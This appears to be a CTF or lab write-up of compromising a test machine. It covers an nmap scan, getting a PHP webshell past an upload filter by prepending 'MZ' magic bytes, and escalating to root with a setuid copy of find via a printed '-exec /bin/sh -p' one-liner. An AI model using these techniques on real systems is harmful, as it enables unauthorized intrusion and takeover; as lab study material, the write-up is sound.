
## Target Information

**IP:** 192.168.180.33 
**OS/Techno:** Debian 5, PHP

## Credentials

**User:**\
**Password:**

## Services

-   **80/tcp HTTP** → File upload functionality. Technology not obvious
    at first, fuzzing reveals backup archive with full website code.\
-   **22/tcp SSH** → Open but no valid username discovered.

## Nmap Scan

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
    |_banner: SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u2
    80/tcp open  http    Apache httpd 2.4.56 ((Debian))
    |_http-server-header: Apache/2.4.56 (Debian)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Exploitation

**File Upload:**\
The application checks for MagicBytes `MZ` (hex `4D5A`) to block PE
executables.\
By prepending `MZ` in a crafted PHP webshell, the upload was accepted
and executed.\
Gained remote shell as `www-data`.

## Privilege Escalation

Enumeration of SUID binaries:

    /opt/fileS
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/bin/chsh
    /usr/bin/chfn
    /usr/bin/fusermount
    /usr/bin/newgrp
    /usr/bin/umount
    /usr/bin/passwd
    /usr/bin/su
    /usr/bin/gpasswd
    /usr/bin/mount
    /usr/bin/sudo

The custom binary `/opt/fileS` was identified as a copy of GNU find
(setuid root).\
Abuse via GTFOBins:

    ./fileS . -exec /bin/sh -p \;

Root shell obtained.

## Result

Privilege escalation successful. Final access: **root**.
